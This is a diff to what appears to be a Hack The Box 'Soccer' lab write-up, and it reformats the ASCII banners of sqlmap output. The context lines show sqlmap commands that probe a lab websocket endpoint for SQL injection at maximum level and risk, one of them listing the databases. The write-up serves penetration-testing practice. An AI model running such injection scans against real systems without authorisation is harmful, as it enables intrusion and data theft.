@@ -571,10 +571,10 @@ It looks like there is a json request sent to the server. We might be able to fi
 ┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
 └─$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "94530"}' --dbms mysql --batch --level 5 --risk 3
         ___
-       __H__                                                                             ___ ___[,]_____ ___ ___  {1.7.8#stable}                    
-|_ -| . ["]     | .'| . |                                   
-|___|_  [,]_|_|_|__,|  _|                                   
-      |_|V...       |_|   https://sqlmap.org                   
+___ ___[(]_____ ___ ___  {1.7.8#stable}                                                
+|_ -| . [,]     | .'| . |                                                               
+|___|_  ["]_|_|_|__,|  _|                                    
+      |_|V...       |_|   https://sqlmap.org                 
 
 [*] starting @ 18:27:07 /2024-03-08/
 
@@ -669,7 +669,8 @@ We have discovered a SQLi vulnerability. Now we can try to identify the database
 ┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
 └─$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "94530"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 --dbs
         ___
-       __H__                                                                             ___ ___[(]_____ ___ ___  {1.7.8#stable}                                                |_ -| . [,]     | .'| . |                                                               
+___ ___[(]_____ ___ ___  {1.7.8#stable}                                                
+|_ -| . [,]     | .'| . |                                                               
 |___|_  ["]_|_|_|__,|  _|                                    
       |_|V...       |_|   https://sqlmap.org                
 
